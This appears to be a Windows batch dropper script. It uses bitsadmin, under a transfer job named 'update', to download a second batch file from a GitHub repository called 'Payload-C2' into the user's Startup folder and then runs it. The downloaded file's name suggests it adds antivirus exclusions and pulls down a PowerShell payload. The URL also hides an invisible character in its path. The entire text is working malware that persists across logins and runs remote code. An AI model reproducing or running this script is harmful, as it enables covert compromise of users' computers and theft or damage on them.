@echo off
cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
bitsadmin /transfer update /download /priority FOREGROUND "https://raw.githubusercontent.com/DieFrikadelle/Payload-C2/refs/heads/main/tester/saiko/saik0/kp%E2%81%ADgjiu/bat/exclusion%2Bdownl_ps.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\exclusion+downl_ps.bat"

cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
start exclusion+downl_ps.bat